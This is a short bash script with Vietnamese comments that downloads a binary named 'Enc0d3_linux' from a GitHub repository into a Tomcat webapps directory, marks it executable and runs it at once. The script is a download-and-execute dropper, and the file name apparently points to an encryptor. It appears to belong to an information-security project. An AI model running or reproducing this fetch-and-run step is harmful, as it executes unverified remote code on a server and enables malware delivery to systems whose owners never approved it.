#!/bin/bash

# Đặt thư mục đích
DEST_DIR="/opt/tomcat/webapps"

# Tạo thư mục nếu chưa tồn tại
mkdir -p "$DEST_DIR"
echo "Đã tạo thư mục: $DEST_DIR"

# Tải file từ URL và lưu vào thư mục đích
echo "Đang tải file từ URL..."
wget -O "$DEST_DIR/Enc0d3_linux" https://github.com/ThanHuuTuan/DT_ATTT_VR/raw/main/Enc0d3_linux

if [ $? -eq 0 ]; then
    echo "Tải file thành công."
else
    echo "Lỗi khi tải file." >&2
    exit 1
fi

# Đặt quyền thực thi cho file đã tải
chmod +x "$DEST_DIR/Enc0d3_linux"
echo "Đã đặt quyền thực thi cho file."

# Chạy file
echo "Đang chạy file..."
"$DEST_DIR/Enc0d3_linux"

if [ $? -eq 0 ]; then
    echo "Chạy file thành công."
else
    echo "Lỗi khi chạy file." >&2
    exit 1
fi
